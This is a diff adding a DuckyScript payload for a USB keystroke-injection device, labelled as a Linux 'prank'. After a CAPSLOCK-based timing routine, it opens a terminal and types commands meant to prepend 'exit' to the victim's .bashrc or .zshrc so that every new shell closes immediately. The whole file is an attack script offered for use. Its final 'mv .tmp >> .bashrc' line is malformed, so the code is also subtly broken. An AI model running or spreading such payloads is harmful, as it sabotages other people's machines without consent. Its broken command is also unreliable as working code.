@@ -1,0 +1,60 @@
+REM ############################################################
+REM #                                                          #
+REM # Title        : This damn shell doesn't work, SO SAD! :C  #
+REM # Author       : Aleff                                     #
+REM # Version      : 1.0                                       #
+REM # Category     : Prank                                     #
+REM # Target       : Linux                                     #
+REM #                                                          #
+REM ############################################################
+
+
+REM Requirements:
+REM     - Nothing <3
+
+
+REM With Kali Linux 2020.4, the new default shell is now ZSH for users who install the distribution.
+VAR $ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX = 0
+
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+
+CTRL-ALT t
+DELAY 2000
+
+STRINGLN echo "exit" > .tmp
+
+IF ($ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX == 1) THEN
+    STRINGLN cat .zshrc >> .tmp
+    STRINGLN mv .tmp >> .zshrc
+ELSE
+    STRINGLN cat .bashrc >> .tmp
+    STRINGLN mv .tmp >> .bashrc
+END_IF
